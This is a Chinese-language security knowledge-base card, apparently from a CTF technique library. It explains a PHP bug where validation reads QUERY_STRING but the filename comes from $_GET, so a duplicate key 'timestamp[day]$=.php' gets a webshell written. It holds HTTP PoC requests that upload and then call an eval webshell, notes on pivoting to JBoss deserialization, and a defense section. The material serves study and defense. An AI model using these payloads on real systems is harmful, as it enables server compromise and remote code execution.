---
id: web-php-query-string-get-parser-differential-upload
title: PHP QUERY_STRING 校验与 $_GET 拼接解析差异：timestamp[day]$ 注入 .php 后缀写 webshell
type: scenario
domain: web
path: web/php
technique: query-string-get-parser-differential-upload
aliases:
- timestamp[day]$
- QUERY_STRING 与 $_GET 不一致
- 参数解析差异
- 上传文件名后缀注入
- 日志系统
tags:
- web
- php
- parser-differential
- file-upload
- webshell
- query-string
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V202
  verified_at: '2026-11-07T02:02:47+08:00'
  notes: 已对照原文与图 25 核对：QUERY_STRING 校验与 $_GET 拼接差异、timestamp[day]$=.php 覆盖为 .php、生成 00.php 一致；未复跑目标。
---

## 一句话结论

`api.php` 用 `$_SERVER['QUERY_STRING']` 的正则提取并校验 year/month/day 为数字，但生成文件名时用 `$_GET` 的解析结果；追加 `timestamp[day]$=.php` 后，PHP 的 `parse_str` 会把 `timestamp[day]$` 也当成 `timestamp[day]`（忽略 `]` 后的尾随字符）并覆盖前值，于是校验看到 `0`、拼接使用 `.php`，文件名变成 `00.php`，写入 PHP webshell。

## 原理

- **校验阶段**：代码从原始 QUERY_STRING 用正则匹配 `timestamp[year]=...&timestamp[month]=...&timestamp[day]=...`，对匹配到的值做 `is_numeric`/整数检查；第一个 `timestamp[day]=0` 能通过。
- **使用阶段**：代码从 `$_GET` 取 `timestamp` 数组并拼接 `year.month.day` 作为文件名。PHP 的 `parse_str` 解析 `timestamp[day]$` 时，`]` 之后的 `$` 被忽略，仍然写入 `$_GET['timestamp']['day']`；由于该参数位于后面，覆盖了前面的 `0`，最终 `day='.php'`。
- 校验与使用读取的是两份不同表示（原始字符串 vs 解析后的数组），这就是参数解析差异（parser differential）；攻击者利用同一逻辑键的重复出现，让“被校验的值”和“被使用的值”不同。
- 文件名由 `00.php` 组成，内容可控，写入 upload 目录后可访问执行；这是“后缀白名单/日志文件名”类上传绕过的变体。
- 后续内网利用：从进程列表发现 JBoss 4.2.3 的 4446 端口，用 CommonsCollections 3.1 反序列化 payload 进一步控制（见关联卡）。

## 触发条件

- 应用从 `$_SERVER['QUERY_STRING']` 或其它原始串做校验，却从 `$_GET`/`$_REQUEST` 取同名参数参与文件名/路径拼接。
- PHP 版本对 `name[index]` 后跟尾随字符的解析会忽略尾随内容（本题环境成立；不同 PHP 版本需实测）。
- 上传/日志写入目录在 Web 可访问路径，且写入内容可控。
- 目录/文件名可预测（本题由 year/month/day 拼成 `00.php`）。

## 利用步骤

1. 构造 QUERY_STRING：`timestamp[year]=0&timestamp[month]=0&timestamp[day]=0&timestamp[day]$=.php`，POST body 为 PHP 代码。
2. 服务端校验读取第一个 `timestamp[day]=0`，通过数字检查。
3. 拼接使用 `$_GET['timestamp']`，`day` 被后一个键覆盖为 `.php`，文件名为 `00.php`。
4. 访问 `/upload/00.php`，POST `1=...` 执行 `eval($_POST[1])`。
5. 进一步内网探测：读进程/端口，发现 JBoss 4.2.3:4446 后投递反序列化 payload。

## PoC

```http
POST /api.php?timestamp[year]=0&timestamp[month]=0&timestamp[day]=0&timestamp[day]$=.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

content=<?php eval($_POST[1]);?>
```

```http
POST /upload/00.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

1=phpinfo();
```

说明：`$_GET` 解析行为依赖 PHP 版本；若目标不复现，先本地用相同版本验证 `parse_str("timestamp[day]$=.php", $out)` 的结果。

## 变体与关联

- **HTTP 参数污染（HPP）**：同名参数在不同层解析不一致，可用于 WAF 绕过、鉴权绕过、文件名注入；与 PHP 的 `[]` 解析差异组合更多。
- **后缀白名单绕过**：双写、点/空格、`::$DATA`、`%00` 截断等；见 [[web-generic-file-upload-blacklist-double-write-bypass]]、[[web-generic-file-upload-null-byte-path-truncation]]。
- **日志文件写入**：把 PHP 代码写进日志再包含；与本题的文件名控制思路类似。
- **内网 JBoss**：见 [[web-java-component-jboss-4-2-3-4446-deserialization]]。

## 检测与防御

- 校验与使用必须基于同一份解析结果（统一从 `$_GET` 取值并先验证类型/范围，再做 `basename`）。
- 文件名白名单 + 固定后缀，禁止把用户输入直接拼进扩展名；上传目录移出 Web 根或禁止脚本执行。
- 禁止 `eval`/动态执行；对上传文件做内容检测与隔离。
- 检测：QUERY_STRING 中出现 `]` 后跟尾随字符的重名参数、校验值与实际文件名不一致、upload 目录出现 PHP 文件。
